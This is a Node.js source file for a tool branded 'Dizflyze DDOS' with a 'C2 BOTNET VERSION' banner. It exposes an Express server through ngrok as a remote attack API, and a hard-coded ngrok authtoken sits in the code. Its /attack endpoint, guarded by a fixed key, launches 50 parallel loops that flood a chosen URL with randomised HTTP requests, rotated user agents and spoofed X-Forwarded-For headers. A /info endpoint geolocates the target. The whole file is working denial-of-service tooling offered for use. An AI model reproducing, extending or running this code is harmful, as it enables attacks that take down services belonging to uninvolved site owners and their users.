require('colors');
const express = require('express');
const ngrok = require('ngrok');
const axios = require('axios');
const app = express();
const bodyParser = require('body-parser');
const crypto = require('crypto');

app.use(bodyParser.json());
let attackActive = false;
let targetInfo = {};
let currentPort = Math.floor(Math.random() * (60000 - 3000 + 1)) + 3000;

const showBanner = () => {
  console.log(`
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Dizflyze
⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] DDOS
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] 3.1.8
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 26-MEI
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `.cyan);
  console.log(`  C2 BOTNET VERSION\n`.yellow);
};

const startNgrok = async () => {
  try {
    await ngrok.authtoken('2xclrXeyimoudAtLmDQu7DibbSJ_42dYjd7bccEoCS23svLnA');
    const url = await ngrok.connect({
      proto: 'http',
      addr: currentPort,
      region: 'ap'
    });
    
    console.log(`\n${'»'.green} ${'[ API C2 ] :'.bold} ${url.underline}`);
    console.log(`${'»'.blue} ${'Status:'.bold} ${'[ INFO ] : [ MENUNGGU ]'.yellow}\n`);
    return url;
  } catch (e) {
    console.log(`\n${'×'.red} ${'[ NGROK ERROR ] :'.bold} ${e.message}`);
    process.exit(1);
  }
};

const attackTarget = async (target, duration) => {
  const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'
  ];

  console.log(`\n${'⚡'.yellow} ${'[ ATTACK ] :'.bold} ${target.underline}`);
  console.log(`${'⏳'.cyan} ${'[ DURASI ]:'.bold} ${duration.toString().yellow} detik\n`);

  const attackPromises = [];
  const startTime = Date.now();
  
  for (let i = 0; i < 50; i++) {
    attackPromises.push(new Promise(async (resolve) => {
      while (Date.now() - startTime < duration * 1000) {
        try {
          await axios({
            method: methods[Math.floor(Math.random() * methods.length)],
            url: target,
            headers: {
              'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
              'X-Forwarded-For': `${crypto.randomInt(1,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(1,255)}`,
              'Accept-Language': 'en-US,en;q=0.9',
              'Cache-Control': 'no-cache'
            },
            timeout: 2500
          });
        } catch (e) {}
      }
      resolve();
    }));
  }

  await Promise.all(attackPromises);
  console.log(`\n${'✓'.green} ${'[ SUCCESS ]'.bold}\n`);
};

app.post('/attack', async (req, res) => {
  if (attackActive) return res.status(429).json({ error: '[ PROSES ]' });
  
  const { target, apiKey } = req.body;
  if (apiKey !== 'TERMUX_KEY') return res.status(403).json({ error: 'Akses tidak valid' });

  try {
    new URL(target);
    attackActive = true;
    attackTarget(target, 60);
    res.status(200).json({ status: '[ START ]', target });
  } catch (e) {
    res.status(400).json({ error: '[ URL INVALID! ]' });
  }
});

app.get('/info', async (req, res) => {
  try {
    const response = await axios.get(`http://ip-api.com/json/${new URL(req.query.target).hostname}`);
    res.json(response.data);
  } catch (e) {
    res.status(500).json({ error: 'Gagal mendapatkan info target' });
  }
});

showBanner();
app.listen(currentPort, () => {
  console.log(`${'»'.cyan} ${'[ RUNING ] :'.bold} ${currentPort.toString().yellow}`);
  startNgrok();
});
